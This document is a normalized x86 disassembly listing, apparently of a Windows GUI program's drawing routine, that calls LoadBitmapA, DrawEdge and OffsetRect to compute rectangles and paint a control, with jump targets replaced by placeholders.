mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423fb4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4595b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428094
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4237e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_455f34
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423fb4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429098
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423f88
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42453c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456224
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fb4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_458f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423ab4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4242ac
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4237e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403290
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_458f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459a5f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_457fe4
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_458f20
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_459a78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45a380
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423fb4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4237e8
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423fb4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_455f34
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423fb4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423fb4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_429098
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423f88
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4243a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_459ec3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428094
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_4237e8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_455f34
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423fb4
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_458f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423ab4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
